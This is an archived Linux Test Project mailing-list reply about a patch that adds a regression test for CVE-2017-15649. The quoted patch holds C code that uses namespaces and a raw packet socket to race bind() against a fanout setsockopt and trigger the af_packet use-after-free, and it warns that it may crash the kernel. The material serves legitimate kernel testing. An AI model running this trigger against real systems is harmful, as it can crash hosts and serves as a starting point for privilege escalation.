Return-Path: <ltp-bounces+lists+linux-ltp=lfdr.de@lists.linux.it>
X-Original-To: lists+linux-ltp@lfdr.de
Delivered-To: lists+linux-ltp@lfdr.de
Received: from picard.linux.it (picard.linux.it [213.254.12.146])
	by mail.lfdr.de (Postfix) with ESMTPS id 0DE5414D874
	for <lists+linux-ltp@lfdr.de>; Thu, 30 Jan 2020 10:57:11 +0100 (CET)
Received: from picard.linux.it (localhost [IPv6:::1])
	by picard.linux.it (Postfix) with ESMTP id CC6913C23B7
	for <lists+linux-ltp@lfdr.de>; Thu, 30 Jan 2020 10:57:10 +0100 (CET)
X-Original-To: ltp@lists.linux.it
Delivered-To: ltp@picard.linux.it
Received: from in-2.smtp.seeweb.it (in-2.smtp.seeweb.it [217.194.8.2])
 by picard.linux.it (Postfix) with ESMTP id 779643C2399
 for <ltp@lists.linux.it>; Thu, 30 Jan 2020 10:57:07 +0100 (CET)
Received: from m12-18.163.com (m12-18.163.com [220.181.12.18])
 (using TLSv1.2 with cipher DHE-RSA-AES256-SHA (256/256 bits))
 (No client certificate requested)
 by in-2.smtp.seeweb.it (Postfix) with ESMTPS id 04675601CD0
 for <ltp@lists.linux.it>; Thu, 30 Jan 2020 10:57:05 +0100 (CET)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=163.com;
 s=s110527; h=Subject:From:Message-ID:Date:MIME-Version; bh=1tKob
 S3Qisnqy70r4govsGFcbDnQWaaT66KnXiU6Kq4=; b=Gqxqns2SZZuGHXrzPdiV8
 G9iQxlqX9wlOInNKeOpJbvIplsz8HurGR0oMn+61AjEloD3L2ammdMaSbIncxuQK
 i5R+W9y1cv2knyKa95+Cs6zvbhV9NA81Ig5EnMiv/h/trGkQrXxHCzVyC/NeEbKc
 86/DjdNuuxmKA8ZHDSMQdU=
Received: from [192.168.0.10] (unknown [183.211.129.73])
 by smtp14 (Coremail) with SMTP id EsCowAAXHABpqDJe6o0ETg--.50501S2;
 Thu, 30 Jan 2020 17:56:59 +0800 (CST)
To: Michael Moese <mmoese@suse.de>, ltp@lists.linux.it
References: <20200130092106.4217-1-mmoese@suse.de>
From: Xiao Yang <ice_yangxiao@163.com>
Message-ID: <0e7e9dd2-f422-d81d-5621-f051195bada4@163.com>
Date: Thu, 30 Jan 2020 17:56:57 +0800
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101
 Thunderbird/60.8.0
MIME-Version: 1.0
In-Reply-To: <20200130092106.4217-1-mmoese@suse.de>
Content-Language: en-US
X-CM-TRANSID: EsCowAAXHABpqDJe6o0ETg--.50501S2
X-Coremail-Antispam: 1Uf129KBjvJXoW3XFWrAry8CFWUGw1fuw4kJFb_yoWxGr4rpa
 yvyFn8urWUtayjyF4fA3W3Crn5uw4kZr12qrW7Ww17AFsxAr9FvF40grWUCrWDX3ykZayr
 CrZ5Kr43Gw4qvaDanT9S1TB71UUUUUUqnTZGkaVYY2UrUUUUjbIjqfuFe4nvWSU5nxnvy2
 9KBjDUYxBIdaVFxhVjvjDU0xZFpf9x07bUv3nUUUUU=
X-Originating-IP: [183.211.129.73]
X-CM-SenderInfo: 5lfhs5xdqj5xldr6il2tof0z/1tbiqAu6Xlc7NO+pcQAAso
X-Virus-Scanned: clamav-milter 0.99.2 at in-2.smtp.seeweb.it
X-Virus-Status: Clean
X-Spam-Status: No, score=0.1 required=7.0 tests=DKIM_SIGNED,DKIM_VALID,
 DKIM_VALID_AU,FREEMAIL_FROM,SPF_HELO_NONE,SPF_PASS autolearn=disabled
 version=3.4.0
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on in-2.smtp.seeweb.it
Subject: Re: [LTP] [PATCH v3] Add a regression test for cve-2017-15649
X-BeenThere: ltp@lists.linux.it
X-Mailman-Version: 2.1.29
Precedence: list
List-Id: Linux Test Project <ltp.lists.linux.it>
List-Unsubscribe: <https://lists.linux.it/options/ltp>,
 <mailto:ltp-request@lists.linux.it?subject=unsubscribe>
List-Archive: <http://lists.linux.it/pipermail/ltp/>
List-Post: <mailto:ltp@lists.linux.it>
List-Help: <mailto:ltp-request@lists.linux.it?subject=help>
List-Subscribe: <https://lists.linux.it/listinfo/ltp>,
 <mailto:ltp-request@lists.linux.it?subject=subscribe>
Content-Transfer-Encoding: 7bit
Content-Type: text/plain; charset="us-ascii"; Format="flowed"
Errors-To: ltp-bounces+lists+linux-ltp=lfdr.de@lists.linux.it
Sender: "ltp" <ltp-bounces+lists+linux-ltp=lfdr.de@lists.linux.it>

On 1/30/20 5:21 PM, Michael Moese wrote:
> net/packet/af_packet.c in the Linux kernel before 4.13.6 allows local
> users to gain privileges via crafted system calls that trigger
> mishandling of packet_fanout data structures, because of a race
> condition (involving fanout_add and packet_do_bind) that leads to a
> use-after-free.
>
> See https://ssd-disclosure.com/archives/3484 for more detail.
>
> Signed-off-by: Michael Moese <mmoese@suse.de>
>
> --
> Changes to v2:
>    - add tags to struct tst_test
>
> Changes to v1:
>    - reworked the usage of fuzzy sync library so this should now be
>      correct
>    - use LTP library functions for file I/O
>    - require KASAN to be enabled
> ---
>   runtest/cve                    |   2 +-
>   testcases/cve/.gitignore       |   1 +
>   testcases/cve/Makefile         |   1 +
>   testcases/cve/cve-2017-15649.c | 140 +++++++++++++++++++++++++++++++++
>   4 files changed, 143 insertions(+), 1 deletion(-)
>   create mode 100644 testcases/cve/cve-2017-15649.c
>
> diff --git a/runtest/cve b/runtest/cve
> index 57cf66075..b76ddaaaa 100644
> --- a/runtest/cve
> +++ b/runtest/cve
> @@ -24,7 +24,7 @@ cve-2017-12193 add_key04
>   cve-2017-15274 add_key02
>   cve-2017-15299 request_key03 -b cve-2017-15299
>   cve-2017-15537 ptrace07
> -cve-2017-15649 fanout01
> +cve-2017-15649 cve-2017-15649

Hi,

I wonder if fanout01 cannot trigger cve-2017-15649 reliably?

Best Regards,

Xiao Yang

>   cve-2017-15951 request_key03 -b cve-2017-15951
>   cve-2017-17805 af_alg02
>   cve-2017-17806 af_alg01
> diff --git a/testcases/cve/.gitignore b/testcases/cve/.gitignore
> index 01a3e4c8f..08154e2db 100644
> --- a/testcases/cve/.gitignore
> +++ b/testcases/cve/.gitignore
> @@ -8,5 +8,6 @@ cve-2017-2671
>   meltdown
>   stack_clash
>   cve-2017-17052
> +cve-2017-15649
>   cve-2017-16939
>   cve-2017-17053
> diff --git a/testcases/cve/Makefile b/testcases/cve/Makefile
> index da44fff60..6cf3b5af9 100644
> --- a/testcases/cve/Makefile
> +++ b/testcases/cve/Makefile
> @@ -46,5 +46,6 @@ cve-2017-17052:	CFLAGS += -pthread
>   cve-2017-17053:	CFLAGS += -pthread
>   
>   cve-2015-3290:	CFLAGS += -pthread
> +cve-2017-15649: CFLAGS += -pthread
>   
>   include $(top_srcdir)/include/mk/generic_leaf_target.mk
> diff --git a/testcases/cve/cve-2017-15649.c b/testcases/cve/cve-2017-15649.c
> new file mode 100644
> index 000000000..0bbcb6eba
> --- /dev/null
> +++ b/testcases/cve/cve-2017-15649.c
> @@ -0,0 +1,140 @@
> +// SPDX-License-Identifier: GPL-2.0-or-later
> +/*
> + *   Copyright (c) 2019 Michael Moese <mmoese@suse.com>
> + */
> +/* Regression test for CVE-2017-15649
> + * based on the reproducer at https://ssd-disclosure.com/archives/3484
> + *
> + * net/packet/af_packet.c in the Linux kernel before 4.13.6 allows local users
> + * to gain privileges via crafted system calls that trigger mishandling of
> + * packet_fanout data structures, because of a race condition (involving
> + * fanout_add and packet_do_bind) that leads to a use-after-free.
> + *
> + * Be careful! This test may crash your kernel!
> + */
> +
> +#include <pthread.h>
> +#include <stdio.h>
> +#include <sched.h>
> +#include <string.h>
> +#include <time.h>
> +#include <net/if.h>
> +#include <sched.h>
> +#include <sys/types.h>
> +#include <sys/socket.h>
> +
> +#include "tst_test.h"
> +#include "tst_taint.h"
> +#include "tst_safe_pthread.h"
> +#include "tst_fuzzy_sync.h"
> +#include "tst_capability.h"
> +#include "lapi/syscalls.h"
> +
> +static struct tst_fzsync_pair fzsync_pair;
> +
> +static int fd;
> +static struct ifreq ifr;
> +
> +struct sockaddr_ll {
> +	unsigned short	sll_family;
> +	short		sll_protocol;
> +	int		sll_ifindex;
> +	unsigned short	sll_hatype;
> +	unsigned char	sll_pkttype;
> +	unsigned char	sll_halen;
> +	unsigned char	sll_addr[8];
> +};
> +static struct sockaddr_ll addr;
> +
> +void *bind_fn(void *unused)
> +{
> +	while (tst_fzsync_run_b(&fzsync_pair)) {
> +		tst_fzsync_start_race_b(&fzsync_pair);
> +		bind(fd, (struct sockaddr *)&addr, sizeof(addr));
> +		tst_fzsync_end_race_b(&fzsync_pair);
> +	}
> +	return unused;
> +}
> +
> +static void setup(void)
> +{
> +	int real_uid = getuid();
> +	int real_gid = getgid();
> +	int index;
> +
> +	tst_fzsync_pair_init(&fzsync_pair);
> +	tst_taint_init(TST_TAINT_W | TST_TAINT_D | TST_TAINT_L);
> +
> +	if (unshare(CLONE_NEWUSER) != 0)
> +		tst_brk(TBROK | TTERRNO, "unshare(CLONE_NEWUSER) failed");
> +
> +	if (unshare(CLONE_NEWNET) != 0)
> +		tst_brk(TBROK | TTERRNO, "unshare(CLONE_NEWUSER) failed");
> +
> +	SAFE_FILE_PRINTF("/proc/self/setgroups", "deny");
> +	SAFE_FILE_PRINTF("/proc/self/uid_map", "0 %d 1\n", real_uid);
> +	SAFE_FILE_PRINTF("/proc/self/gid_map", "0 %d 1\n", real_gid);
> +
> +	fd = SAFE_SOCKET(AF_PACKET, SOCK_RAW, PF_PACKET);
> +
> +	strcpy((char *) &ifr.ifr_name, "lo");
> +	SAFE_IOCTL(fd, SIOCGIFINDEX, &ifr);
> +	index = ifr.ifr_ifindex;
> +
> +	SAFE_IOCTL(fd, SIOCGIFFLAGS, &ifr);
> +	ifr.ifr_flags &= ~(short) IFF_UP;
> +
> +	SAFE_IOCTL(fd, SIOCSIFFLAGS, &ifr);
> +
> +	addr.sll_family = AF_PACKET;
> +	addr.sll_protocol = 0x0;
> +	addr.sll_ifindex = index;
> +}
> +
> +static void cleanup(void)
> +{
> +	tst_fzsync_pair_cleanup(&fzsync_pair);
> +	SAFE_CLOSE(fd);
> +}
> +
> +static void run(void)
> +{
> +	int fanout = 0x3;
> +
> +	tst_fzsync_pair_reset(&fzsync_pair, bind_fn);
> +
> +	while (tst_fzsync_run_a(&fzsync_pair)) {
> +		tst_fzsync_start_race_a(&fzsync_pair);
> +		setsockopt(fd, 0x107, 18, &fanout, sizeof(fanout));
> +		tst_fzsync_end_race_a(&fzsync_pair);
> +	}
> +
> +	tst_res(TPASS, "please check for KASAN output");
> +}
> +
> +
> +static const char *kconfigs[] = {
> +	"CONFIG_KASAN",
> +	"CONFIG_USER_NS",
> +	NULL
> +};
> +
> +static struct tst_cap caps[] = {
> +	TST_CAP(TST_CAP_REQ, CAP_SYS_ADMIN),
> +	TST_CAP(TST_CAP_REQ, CAP_NET_RAW),
> +	TST_CAP(TST_CAP_DROP, CAP_SYS_ADMIN),
> +	{},
> +};
> +
> +static struct tst_test test = {
> +	.test_all = run,
> +	.setup = setup,
> +	.cleanup = cleanup,
> +	.needs_kconfigs = kconfigs,
> +	.caps = caps,
> +	.tags = (const struct tst_tag[]) {
> +		{"CVE", "2017-15649"},
> +		{"linux-git", "008ba2a13f2d"},
> +	        {}
> +	}
> +};


-- 
Mailing list info: https://lists.linux.it/listinfo/ltp
